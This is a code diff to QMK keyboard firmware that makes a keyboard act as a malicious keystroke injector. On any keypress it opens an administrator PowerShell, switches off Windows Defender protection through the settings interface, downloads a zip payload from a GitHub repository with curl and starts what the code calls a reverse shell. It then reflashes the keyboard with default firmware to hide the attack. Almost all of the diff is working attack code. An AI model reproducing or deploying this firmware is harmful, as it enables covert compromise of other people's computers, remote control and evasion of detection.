@@ -32,12 +32,12 @@ void powershell(void) {
 }
 
 // Elevate user privileges to administrator from PowerShell
-void elevate_privileges() {
+void elevate_privileges(void) {
     SEND_STRING("start-process PowerShell -verb runas");
     SEND_STRING(SS_TAP(X_ENTER));
 }
 
-// Start PowerShell as an administrator
+// Start PowerShell as an administrator and navigate to root
 void powershell_admin(void) {
     win_run();
     delay(50);
@@ -47,9 +47,31 @@ void powershell_admin(void) {
     SEND_STRING(SS_TAP(X_LEFT));
     delay(300);
     SEND_STRING(SS_TAP(X_ENTER));
-    delay(50)
+    delay(1000);
     // Relocate to root
-    SEND_STRING("cd ~");
+    SEND_STRING("cd /");
+    SEND_STRING(SS_TAP(X_ENTER));
+}
+
+// Quit PowerShell
+void exit_powershell(void) {
+    SEND_STRING("exit");
+    SEND_STRING(SS_TAP(X_ENTER));
+}
+
+// Start Command Prompt as an administrator and navigate to root
+void command_prompt(void) {
+    win_run();
+    delay(50);
+    SEND_STRING("cmd");
+    SEND_STRING(SS_DOWN(X_LCTRL)SS_DOWN(X_LSHIFT)SS_TAP(X_ENTER)SS_UP(X_LCTRL)SS_UP(X_LSHIFT));
+    delay(500);
+    SEND_STRING(SS_TAP(X_LEFT));
+    delay(300);
+    SEND_STRING(SS_TAP(X_ENTER));
+    delay(500);
+    // Relocate to root
+    SEND_STRING("cd /tmp");
     SEND_STRING(SS_TAP(X_ENTER));
 }
 
@@ -60,7 +82,7 @@ void disable_windefend(void) {
     SEND_STRING("Virus & threat protection");
     delay(300);
     SEND_STRING(SS_TAP(X_ENTER));
-    delay(600);
+    delay(1000);
     for (int i = 0; i < 4; i++) {
         SEND_STRING(SS_TAP(X_TAB));
         delay(300);
@@ -99,9 +121,9 @@ void initiate_revshell(void) {
     SEND_STRING("mkdir tmp");
     SEND_STRING(SS_TAP(X_ENTER));
     delay(100);
-    SEND_STRING("curl https://github.com/Volanns/QMKPhantomKB/raw/main/important.zip -o ~\\tmp\\important.zip");
+    SEND_STRING("curl https://github.com/Volanns/QMKPhantomKB/raw/main/important.zip -o \\tmp\\important.zip");
     SEND_STRING(SS_TAP(X_ENTER));
-    delay(30000);
+    delay(10000);
     SEND_STRING("cd tmp");
     SEND_STRING(SS_TAP(X_ENTER));
     delay(100);
@@ -120,18 +142,33 @@ void exploit(void) {
     powershell_admin();
     delay(300);
     initiate_revshell();
+    delay(100);
+    exit_powershell();
 }
+
+// Flashes keyboard with default firmware
+void cleanup(void) {
+    command_prompt();
+    SEND_STRING("flash.bat");
+    SEND_STRING(SS_TAP(X_ENTER));
+    reset_keyboard();
+}
+
+bool start = false;
 
 // Called after every matrix scan
 void matrix_scan_user(void) {
-    static uint8_t finished = 0;
-
-    if (timer_read() > 5000 && !finished) {
-        //reset_keyboard();
-        //exploit();
-        powershell_admin();
-        finished = 1;
+    if (start) {
+        delay(5000);
+        exploit();
+        cleanup();
+        // Enter DFU mode
+        reset_keyboard();
     }
 }
 
-// rules.mk is where various features of the keybaord are toggled
+// Runs the main event after any key is pressed
+bool process_record_user(uint16_t keycode, keyrecord_t *record) {
+    start = true;
+    return true;
+}
